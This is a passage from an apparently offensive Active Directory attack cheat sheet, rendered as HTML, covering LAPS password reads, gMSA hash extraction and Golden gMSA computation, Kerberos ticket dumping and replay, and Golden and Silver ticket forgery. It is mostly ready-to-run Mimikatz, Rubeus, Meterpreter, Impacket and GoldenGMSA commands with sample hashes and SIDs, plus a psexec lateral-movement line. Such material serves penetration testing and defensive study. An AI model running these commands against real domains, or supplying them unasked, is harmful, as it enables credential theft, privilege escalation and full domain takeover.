      <div class="highlight"><pre><span></span><code><a id="__codelineno-132-1" name="__codelineno-132-1" href="#__codelineno-132-1"></a>ldapsearch<span class="w"> </span>-x<span class="w"> </span>-h<span class="w">  </span>-D<span class="w"> </span><span class="s2">&quot;@&quot;</span><span class="w"> </span>-w<span class="w">  </span>-b<span class="w"> </span><span class="s2">&quot;dc=&lt;&gt;,dc=&lt;&gt;,dc=&lt;&gt;&quot;</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=computer)(ms-MCS-AdmPwd=*))&quot;</span><span class="w"> </span>ms-MCS-AdmPwd<span class="sb">`</span>
</code></pre></div></p>
</li>
</ul>
<h3 id="grant-laps-access">Grant LAPS Access</h3>
<p>The members of the group <strong>"Account Operator"</strong> can add and modify all the non admin users and groups. Since <strong>LAPS ADM</strong> and <strong>LAPS READ</strong> are considered as non admin groups, it's possible to add an user to them, and read the LAPS admin password</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-133-1" name="__codelineno-133-1" href="#__codelineno-133-1"></a><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s1">&#39;LAPS ADM&#39;</span> <span class="n">-Members</span> <span class="s1">&#39;user1&#39;</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Domain</span> <span class="s2">&quot;domain.local&quot;</span>
<a id="__codelineno-133-2" name="__codelineno-133-2" href="#__codelineno-133-2"></a><span class="nb">Add-DomainGroupMember</span> <span class="n">-Identity</span> <span class="s1">&#39;LAPS READ&#39;</span> <span class="n">-Members</span> <span class="s1">&#39;user1&#39;</span> <span class="n">-Credential</span> <span class="nv">$cred</span> <span class="n">-Domain</span> <span class="s2">&quot;domain.local&quot;</span>
</code></pre></div>
<h2 id="reading-gmsa-password">Reading GMSA Password</h2>
<blockquote>
<p>User accounts created to be used as service accounts rarely have their password changed. Group Managed Service Accounts (GMSAs) provide a better approach (starting in the Windows 2012 timeframe). The password is managed by AD and automatically rotated every 30 days to a randomly generated password of 256 bytes.</p>
</blockquote>
<h3 id="gmsa-attributes-in-the-active-directory">GMSA Attributes in the Active Directory</h3>
<ul>
<li><code>msDS-GroupMSAMembership</code> (<code>PrincipalsAllowedToRetrieveManagedPassword</code>) - stores the security principals that can access the GMSA password.</li>
<li><code>msds-ManagedPassword</code> - This attribute contains a BLOB with password information for group-managed service accounts.</li>
<li><code>msDS-ManagedPasswordId</code> - This constructed attribute contains the key identifier for the current managed password data for a group MSA.</li>
<li><code>msDS-ManagedPasswordInterval</code> - This attribute is used to retrieve the number of days before a managed password is automatically changed for a group MSA.</li>
</ul>
<h3 id="extract-nt-hash-from-the-active-directory">Extract NT hash from the Active Directory</h3>
<ul>
<li>
<p><a href="https://github.com/rvazarkar/GMSAPasswordReader">GMSAPasswordReader</a> (C#)
  <div class="highlight"><pre><span></span><code><a id="__codelineno-134-1" name="__codelineno-134-1" href="#__codelineno-134-1"></a><span class="c"># https://github.com/rvazarkar/GMSAPasswordReader</span>
<a id="__codelineno-134-2" name="__codelineno-134-2" href="#__codelineno-134-2"></a><span class="n">GMSAPasswordReader</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-accountname</span> <span class="n">SVC_SERVICE_ACCOUNT</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper (Python)</a>
   <code>powershell
  # https://github.com/micahvandeusen/gMSADumper
  python3 gMSADumper.py -u User -p Password1 -d domain.local</code></p>
</li>
<li>
<p>Active Directory Powershell
  <div class="highlight"><pre><span></span><code><a id="__codelineno-135-1" name="__codelineno-135-1" href="#__codelineno-135-1"></a><span class="nv">$gmsa</span> <span class="p">=</span>  <span class="nb">Get-ADServiceAccount</span> <span class="n">-Identity</span> <span class="s1">&#39;SVC_SERVICE_ACCOUNT&#39;</span> <span class="n">-Properties</span> <span class="s1">&#39;msDS-ManagedPassword&#39;</span>
<a id="__codelineno-135-2" name="__codelineno-135-2" href="#__codelineno-135-2"></a><span class="nv">$blob</span> <span class="p">=</span> <span class="nv">$gmsa</span><span class="p">.</span><span class="s1">&#39;msDS-ManagedPassword&#39;</span>
<a id="__codelineno-135-3" name="__codelineno-135-3" href="#__codelineno-135-3"></a><span class="nv">$mp</span> <span class="p">=</span> <span class="nb">ConvertFrom-ADManagedPasswordBlob</span> <span class="nv">$blob</span>
<a id="__codelineno-135-4" name="__codelineno-135-4" href="#__codelineno-135-4"></a><span class="nv">$hash1</span> <span class="p">=</span>  <span class="nb">ConvertTo-NTHash</span> <span class="n">-Password</span> <span class="nv">$mp</span><span class="p">.</span><span class="n">SecureCurrentPassword</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://gist.github.com/kdejoyce/f0b8f521c426d04740148d72f5ea3f6f#file-gmsa_permissions_collection-ps1">gMSA_Permissions_Collection.ps1</a> based on Active Directory PowerShell module</p>
</li>
</ul>
<h2 id="forging-golden-gmsa">Forging Golden GMSA</h2>
<blockquote>
<p>One notable difference between a <strong>Golden Ticket</strong> attack and the <strong>Golden GMSA</strong> attack is that they no way of rotating the KDS root key secret. Therefore, if a KDS root key is compromised, there is no way to protect the gMSAs associated with it.</p>
</blockquote>
<p><img alt="⚠" class="twemoji" src="https://cdnjs.cloudflare.com/ajax/libs/twemoji/14.0.2/svg/26a0.svg" title=":warning:" /> You can't "force reset" a gMSA password, because a gMSA's password never changes. The password is derived from the KDS root key and <code>ManagedPasswordIntervalInDays</code>, so every Domain Controller can at any time compute what the password is, what it used to be, and what it will be at any point in the future.</p>
<ul>
<li>Using <a href="https://github.com/Semperis/GoldenGMSA">GoldenGMSA</a>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-136-1" name="__codelineno-136-1" href="#__codelineno-136-1"></a><span class="c"># Enumerate all gMSAs</span>
<a id="__codelineno-136-2" name="__codelineno-136-2" href="#__codelineno-136-2"></a><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">gmsainfo</span>
<a id="__codelineno-136-3" name="__codelineno-136-3" href="#__codelineno-136-3"></a><span class="c"># Query for a specific gMSA</span>
<a id="__codelineno-136-4" name="__codelineno-136-4" href="#__codelineno-136-4"></a><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">gmsainfo</span> <span class="p">-</span><span class="n">-sid</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1437000690</span><span class="p">-</span><span class="n">1664695696</span><span class="p">-</span><span class="n">1586295871</span><span class="p">-</span><span class="n">1112</span>
<a id="__codelineno-136-5" name="__codelineno-136-5" href="#__codelineno-136-5"></a>
<a id="__codelineno-136-6" name="__codelineno-136-6" href="#__codelineno-136-6"></a><span class="c"># Dump all KDS Root Keys</span>
<a id="__codelineno-136-7" name="__codelineno-136-7" href="#__codelineno-136-7"></a><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">kdsinfo</span>
<a id="__codelineno-136-8" name="__codelineno-136-8" href="#__codelineno-136-8"></a><span class="c"># Dump a specific KDS Root Key</span>
<a id="__codelineno-136-9" name="__codelineno-136-9" href="#__codelineno-136-9"></a><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">kdsinfo</span> <span class="p">-</span><span class="n">-guid</span> <span class="n">46e5b8b9-ca57</span><span class="p">-</span><span class="n">01e6-e8b9-fbb267e4adeb</span>
<a id="__codelineno-136-10" name="__codelineno-136-10" href="#__codelineno-136-10"></a>
<a id="__codelineno-136-11" name="__codelineno-136-11" href="#__codelineno-136-11"></a><span class="c"># Compute gMSA password</span>
<a id="__codelineno-136-12" name="__codelineno-136-12" href="#__codelineno-136-12"></a><span class="c"># --sid &lt;gMSA SID&gt;: SID of the gMSA (required)</span>
<a id="__codelineno-136-13" name="__codelineno-136-13" href="#__codelineno-136-13"></a><span class="c"># --kdskey &lt;Base64-encoded blob&gt;: Base64 encoded KDS Root Key</span>
<a id="__codelineno-136-14" name="__codelineno-136-14" href="#__codelineno-136-14"></a><span class="c"># --pwdid &lt;Base64-encoded blob&gt;: Base64 of msds-ManagedPasswordID attribute value</span>
<a id="__codelineno-136-15" name="__codelineno-136-15" href="#__codelineno-136-15"></a><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">compute</span> <span class="p">-</span><span class="n">-sid</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1437000690</span><span class="p">-</span><span class="n">1664695696</span><span class="p">-</span><span class="n">1586295871</span><span class="p">-</span><span class="n">1112</span> <span class="c"># requires privileged access to the domain</span>
<a id="__codelineno-136-16" name="__codelineno-136-16" href="#__codelineno-136-16"></a><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">compute</span> <span class="p">-</span><span class="n">-sid</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1437000690</span><span class="p">-</span><span class="n">1664695696</span><span class="p">-</span><span class="n">1586295871</span><span class="p">-</span><span class="n">1112</span> <span class="p">-</span><span class="n">-kdskey</span> <span class="n">AQAAALm45UZXyuYB</span><span class="p">[...]</span><span class="n">G2</span><span class="p">/</span><span class="n">M</span><span class="p">=</span> <span class="c"># requires LDAP access</span>
<a id="__codelineno-136-17" name="__codelineno-136-17" href="#__codelineno-136-17"></a><span class="n">GoldenGMSA</span><span class="p">.</span><span class="n">exe</span> <span class="n">compute</span> <span class="p">-</span><span class="n">-sid</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1437000690</span><span class="p">-</span><span class="n">1664695696</span><span class="p">-</span><span class="n">1586295871</span><span class="p">-</span><span class="n">1112</span> <span class="p">-</span><span class="n">-kdskey</span> <span class="n">AQAAALm45U</span><span class="p">[...]</span><span class="n">SM0R7djG2</span><span class="p">/</span><span class="n">M</span><span class="p">=</span> <span class="p">-</span><span class="n">-pwdid</span> <span class="n">AQAAA</span><span class="p">[..]</span><span class="n">AAA</span> <span class="c"># Offline mode</span>
</code></pre></div></li>
</ul>
<h2 id="kerberos-tickets">Kerberos Tickets</h2>
<p>Tickets are used to grant access to network resources. A ticket is a data structure that contains information about the user's identity, the network service or resource being accessed, and the permissions or privileges associated with that resource. Kerberos tickets have a limited lifetime and expire after a set period of time, typically 8 to 12 hours.</p>
<p>There are two types of tickets in Kerberos:</p>
<ul>
<li>
<p><strong>Ticket Granting Ticket</strong> (TGT): The TGT is obtained by the user during the initial authentication process. It is used to request additional service tickets without requiring the user to re-enter their credentials. The TGT contains the user's identity, a timestamp, and an encryption of the user's secret key.</p>
</li>
<li>
<p><strong>Service Ticket</strong> (ST): The service ticket is used to access a specific network service or resource. The user presents the service ticket to the service or resource, which then uses the ticket to authenticate the user and grant access to the requested resource. The service ticket contains the user's identity, a timestamp, and an encryption of the service's secret key.</p>
</li>
</ul>
<h3 id="dump-kerberos-tickets">Dump Kerberos Tickets</h3>
<ul>
<li>Mimikatz: <code>sekurlsa::tickets /export</code></li>
<li>Rubeus 
  <div class="highlight"><pre><span></span><code><a id="__codelineno-137-1" name="__codelineno-137-1" href="#__codelineno-137-1"></a><span class="c"># List available tickets</span>
<a id="__codelineno-137-2" name="__codelineno-137-2" href="#__codelineno-137-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">triage</span>
<a id="__codelineno-137-3" name="__codelineno-137-3" href="#__codelineno-137-3"></a>
<a id="__codelineno-137-4" name="__codelineno-137-4" href="#__codelineno-137-4"></a><span class="c"># Dump one ticket, the output is in Kirbi format</span>
<a id="__codelineno-137-5" name="__codelineno-137-5" href="#__codelineno-137-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span> <span class="p">/</span><span class="n">luid</span><span class="p">:</span><span class="n">0x12d1f7</span>
</code></pre></div></li>
</ul>
<h3 id="replay-kerberos-tickets">Replay Kerberos Tickets</h3>
<ul>
<li>Mimikatz: <code>mimikatz.exe "kerberos::ptc C:\temp\TGT_Administrator@lab.local.ccache"</code></li>
<li>CrackMapExec: <code>KRB5CCNAME=/tmp/administrator.ccache crackmapexec smb 10.10.10 -u user --use-kcache</code></li>
</ul>
<h3 id="convert-kerberos-tickets">Convert Kerberos Tickets</h3>
<p>In the Kerberos authentication protocol, ccache and kirbi are two types of Kerberos credential caches that are used to store Kerberos tickets.</p>
<ul>
<li>
<p>A credential cache, or <code>"ccache"</code> is a temporary storage area for Kerberos tickets that are obtained during the authentication process. The ccache contains the user's authentication credentials and is used to access network resources without having to re-enter the user's credentials for each request.</p>
</li>
<li>
<p>The Kerberos Integrated Windows Authentication (KIWA) protocol used by Microsoft Windows systems also makes use of a credential cache called a <code>"kirbi"</code> cache. The kirbi cache is similar to the ccache used by standard Kerberos implementations, but with some differences in the way it is structured and managed.</p>
</li>
</ul>
<p>While both caches serve the same basic purpose of storing Kerberos tickets to enable efficient access to network resources, they differ in format and structure. You can convert them easily using:</p>
<ul>
<li>kekeo: <code>misc::convert ccache ticket.kirbi</code></li>
<li>impacket: <code>impacket-ticketConverter SRV01.kirbi SRV01.ccache</code></li>
</ul>
<h3 id="pass-the-ticket-golden-tickets">Pass-the-Ticket Golden Tickets</h3>
<p>Forging a TGT require:
* the <code>krbtgt</code> NT hash
* since recently, we cannot use a non-existent account name as a result of <code>CVE-2021-42287</code> mitigations</p>
<blockquote>
<p>The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.</p>
</blockquote>
<h4 id="using-mimikatz">Using Mimikatz</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-138-1" name="__codelineno-138-1" href="#__codelineno-138-1"></a><span class="c"># Get info - Mimikatz</span>
<a id="__codelineno-138-2" name="__codelineno-138-2" href="#__codelineno-138-2"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">krbtgt</span>
<a id="__codelineno-138-3" name="__codelineno-138-3" href="#__codelineno-138-3"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">patch</span>
<a id="__codelineno-138-4" name="__codelineno-138-4" href="#__codelineno-138-4"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">trust</span> <span class="p">/</span><span class="n">patch</span>
<a id="__codelineno-138-5" name="__codelineno-138-5" href="#__codelineno-138-5"></a><span class="n">lsadump</span><span class="p">::</span><span class="n">dcsync</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">krbtgt</span>
<a id="__codelineno-138-6" name="__codelineno-138-6" href="#__codelineno-138-6"></a>
<a id="__codelineno-138-7" name="__codelineno-138-7" href="#__codelineno-138-7"></a><span class="c"># Forge a Golden ticket - Mimikatz</span>
<a id="__codelineno-138-8" name="__codelineno-138-8" href="#__codelineno-138-8"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">purge</span>
<a id="__codelineno-138-9" name="__codelineno-138-9" href="#__codelineno-138-9"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">evil</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">pentestlab</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3737340914</span><span class="p">-</span><span class="n">2019594255</span><span class="p">-</span><span class="n">2413685307</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="n">d125e4f69c851529045ec95ca80fa37e</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">evil</span><span class="p">.</span><span class="n">tck</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-138-10" name="__codelineno-138-10" href="#__codelineno-138-10"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">tgt</span>
</code></pre></div>
<h4 id="using-meterpreter">Using Meterpreter</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-139-1" name="__codelineno-139-1" href="#__codelineno-139-1"></a><span class="c"># Get info - Meterpreter(kiwi)</span>
<a id="__codelineno-139-2" name="__codelineno-139-2" href="#__codelineno-139-2"></a><span class="n">dcsync_ntlm</span> <span class="n">krbtgt</span>
<a id="__codelineno-139-3" name="__codelineno-139-3" href="#__codelineno-139-3"></a><span class="n">dcsync</span> <span class="n">krbtgt</span>
<a id="__codelineno-139-4" name="__codelineno-139-4" href="#__codelineno-139-4"></a>
<a id="__codelineno-139-5" name="__codelineno-139-5" href="#__codelineno-139-5"></a><span class="c"># Forge a Golden ticket - Meterpreter</span>
<a id="__codelineno-139-6" name="__codelineno-139-6" href="#__codelineno-139-6"></a><span class="n">load</span> <span class="n">kiwi</span>
<a id="__codelineno-139-7" name="__codelineno-139-7" href="#__codelineno-139-7"></a><span class="n">golden_ticket_create</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">domainname</span><span class="p">&gt;</span> <span class="n">-k</span> <span class="p">&lt;</span><span class="n">nthashof</span> <span class="n">krbtgt</span><span class="p">&gt;</span> <span class="n">-s</span> <span class="p">&lt;</span><span class="n">SID</span> <span class="n">without</span> <span class="n">le</span> <span class="n">RID</span><span class="p">&gt;</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">user_for_the_ticket</span><span class="p">&gt;</span> <span class="n">-t</span> <span class="p">&lt;</span><span class="n">location_to_store_tck</span><span class="p">&gt;</span>
<a id="__codelineno-139-8" name="__codelineno-139-8" href="#__codelineno-139-8"></a><span class="n">golden_ticket_create</span> <span class="n">-d</span> <span class="n">pentestlab</span><span class="p">.</span><span class="n">local</span> <span class="n">-u</span> <span class="n">pentestlabuser</span> <span class="n">-s</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3737340914</span><span class="p">-</span><span class="n">2019594255</span><span class="p">-</span><span class="n">2413685307</span> <span class="n">-k</span> <span class="n">d125e4f69c851529045ec95ca80fa37e</span> <span class="n">-t</span> <span class="p">/</span><span class="n">root</span><span class="p">/</span><span class="n">Downloads</span><span class="p">/</span><span class="n">pentestlabuser</span><span class="p">.</span><span class="n">tck</span>
<a id="__codelineno-139-9" name="__codelineno-139-9" href="#__codelineno-139-9"></a><span class="n">kerberos_ticket_purge</span>
<a id="__codelineno-139-10" name="__codelineno-139-10" href="#__codelineno-139-10"></a><span class="n">kerberos_ticket_use</span> <span class="p">/</span><span class="n">root</span><span class="p">/</span><span class="n">Downloads</span><span class="p">/</span><span class="n">pentestlabuser</span><span class="p">.</span><span class="n">tck</span>
<a id="__codelineno-139-11" name="__codelineno-139-11" href="#__codelineno-139-11"></a><span class="n">kerberos_ticket_list</span>
</code></pre></div>
<h4 id="using-a-ticket-on-linux">Using a ticket on Linux</h4>
<div class="highlight"><pre><span></span><code><a id="__codelineno-140-1" name="__codelineno-140-1" href="#__codelineno-140-1"></a><span class="c"># Convert the ticket kirbi to ccache with kekeo</span>
<a id="__codelineno-140-2" name="__codelineno-140-2" href="#__codelineno-140-2"></a><span class="n">misc</span><span class="p">::</span><span class="n">convert</span> <span class="n">ccache</span> <span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
<a id="__codelineno-140-3" name="__codelineno-140-3" href="#__codelineno-140-3"></a>
<a id="__codelineno-140-4" name="__codelineno-140-4" href="#__codelineno-140-4"></a><span class="c"># Alternatively you can use ticketer from Impacket</span>
<a id="__codelineno-140-5" name="__codelineno-140-5" href="#__codelineno-140-5"></a><span class="p">./</span><span class="n">ticketer</span><span class="p">.</span><span class="n">py</span> <span class="n">-nthash</span> <span class="n">a577fcf16cfef780a2ceb343ec39a0d9</span> <span class="n">-domain-sid</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2972629792</span><span class="p">-</span><span class="n">1506071460</span><span class="p">-</span><span class="n">1188933728</span> <span class="n">-domain</span> <span class="n">amity</span><span class="p">.</span><span class="n">local</span> <span class="n">mbrody-da</span>
<a id="__codelineno-140-6" name="__codelineno-140-6" href="#__codelineno-140-6"></a>
<a id="__codelineno-140-7" name="__codelineno-140-7" href="#__codelineno-140-7"></a><span class="n">ticketer</span><span class="p">.</span><span class="n">py</span> <span class="n">-nthash</span> <span class="n">HASHKRBTGT</span> <span class="n">-domain-sid</span> <span class="n">SID_DOMAIN_A</span> <span class="n">-domain</span> <span class="n">DEV</span> <span class="n">Administrator</span> <span class="n">-extra-sid</span> <span class="n">SID_DOMAIN_B_ENTERPRISE_519</span>
<a id="__codelineno-140-8" name="__codelineno-140-8" href="#__codelineno-140-8"></a><span class="p">./</span><span class="n">ticketer</span><span class="p">.</span><span class="n">py</span> <span class="n">-nthash</span> <span class="n">e65b41757ea496c2c60e82c05ba8b373</span> <span class="n">-domain-sid</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">354401377</span><span class="p">-</span><span class="n">2576014548</span><span class="p">-</span><span class="n">1758765946</span> <span class="n">-domain</span> <span class="n">DEV</span> <span class="n">Administrator</span> <span class="n">-extra-sid</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2992845451</span><span class="p">-</span><span class="n">2057077057</span><span class="p">-</span><span class="n">2526624608</span><span class="p">-</span><span class="n">519</span>
<a id="__codelineno-140-9" name="__codelineno-140-9" href="#__codelineno-140-9"></a>
<a id="__codelineno-140-10" name="__codelineno-140-10" href="#__codelineno-140-10"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">user</span><span class="p">/</span><span class="n">ticket</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-140-11" name="__codelineno-140-11" href="#__codelineno-140-11"></a><span class="nb">cat </span><span class="nv">$KRB5CCNAME</span>
<a id="__codelineno-140-12" name="__codelineno-140-12" href="#__codelineno-140-12"></a>
<a id="__codelineno-140-13" name="__codelineno-140-13" href="#__codelineno-140-13"></a><span class="c"># NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file</span>
<a id="__codelineno-140-14" name="__codelineno-140-14" href="#__codelineno-140-14"></a><span class="p">./</span><span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="n">AD</span><span class="p">/</span><span class="n">administrator</span><span class="nv">@192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> 
</code></pre></div>
<p>If you need to swap ticket between Windows and Linux, you need to convert them with <code>ticket_converter</code> or <code>kekeo</code>.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-141-1" name="__codelineno-141-1" href="#__codelineno-141-1"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:</span><span class="n">ticket_converter</span><span class="p">$</span> <span class="n">python</span> <span class="n">ticket_converter</span><span class="p">.</span><span class="n">py</span> <span class="n">velociraptor</span><span class="p">.</span><span class="n">ccache</span> <span class="n">velociraptor</span><span class="p">.</span><span class="n">kirbi</span>
<a id="__codelineno-141-2" name="__codelineno-141-2" href="#__codelineno-141-2"></a><span class="n">Converting</span> <span class="n">ccache</span> <span class="p">=&gt;</span> <span class="n">kirbi</span>
<a id="__codelineno-141-3" name="__codelineno-141-3" href="#__codelineno-141-3"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:</span><span class="n">ticket_converter</span><span class="p">$</span> <span class="n">python</span> <span class="n">ticket_converter</span><span class="p">.</span><span class="n">py</span> <span class="n">velociraptor</span><span class="p">.</span><span class="n">kirbi</span> <span class="n">velociraptor</span><span class="p">.</span><span class="n">ccache</span>
<a id="__codelineno-141-4" name="__codelineno-141-4" href="#__codelineno-141-4"></a><span class="n">Converting</span> <span class="n">kirbi</span> <span class="p">=&gt;</span> <span class="n">ccache</span>
</code></pre></div>
<p>Mitigations:
* Hard to detect because they are legit TGT tickets
* Mimikatz generate a golden ticket with a life-span of 10 years</p>
<h3 id="pass-the-ticket-silver-tickets">Pass-the-Ticket Silver Tickets</h3>
<p>Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-142-1" name="__codelineno-142-1" href="#__codelineno-142-1"></a><span class="c"># Create a ticket for the service</span>
<a id="__codelineno-142-2" name="__codelineno-142-2" href="#__codelineno-142-2"></a><span class="n">mimikatz</span> <span class="p">$</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">USERNAME</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">FQDN</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">DOMAIN-SID</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">TARGET-HOST</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">FQDN</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">TARGET-MACHINE-NT-HASH</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">SERVICE</span>
<a id="__codelineno-142-3" name="__codelineno-142-3" href="#__codelineno-142-3"></a>
<a id="__codelineno-142-4" name="__codelineno-142-4" href="#__codelineno-142-4"></a><span class="c"># Examples</span>
<a id="__codelineno-142-5" name="__codelineno-142-5" href="#__codelineno-142-5"></a><span class="n">mimikatz</span> <span class="p">$</span> <span class="p">/</span><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">adsec</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">ANY</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1423455951</span><span class="p">-</span><span class="n">1752654185</span><span class="p">-</span><span class="n">1824483205</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">DESKTOP</span><span class="p">-</span><span class="n">01</span><span class="p">.</span><span class="n">adsec</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-142-6" name="__codelineno-142-6" href="#__codelineno-142-6"></a><span class="n">mimikatz</span> <span class="p">$</span> <span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">jurassic</span><span class="p">.</span><span class="n">park</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">1339291983</span><span class="p">-</span><span class="n">1349129144</span><span class="p">-</span><span class="n">367733775</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:</span><span class="n">b18b4b218eccad1c223306ea1916885f</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">stegosaurus</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span> <span class="p">/</span><span class="n">target</span><span class="p">:</span><span class="n">labwws02</span><span class="p">.</span><span class="n">jurassic</span><span class="p">.</span><span class="n">park</span>
<a id="__codelineno-142-7" name="__codelineno-142-7" href="#__codelineno-142-7"></a>
<a id="__codelineno-142-8" name="__codelineno-142-8" href="#__codelineno-142-8"></a><span class="c"># Then use the same steps as a Golden ticket</span>
<a id="__codelineno-142-9" name="__codelineno-142-9" href="#__codelineno-142-9"></a><span class="n">mimikatz</span> <span class="p">$</span> <span class="n">misc</span><span class="p">::</span><span class="n">convert</span> <span class="n">ccache</span> <span class="n">ticket</span><span class="p">.</span><span class="n">kirbi</span>
<a id="__codelineno-142-10" name="__codelineno-142-10" href="#__codelineno-142-10"></a>
<a id="__codelineno-142-11" name="__codelineno-142-11" href="#__codelineno-142-11"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:/</span><span class="n">tmp</span><span class="p">$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=/</span><span class="n">home</span><span class="p">/</span><span class="n">user</span><span class="p">/</span><span class="n">ticket</span><span class="p">.</span><span class="n">ccache</span>
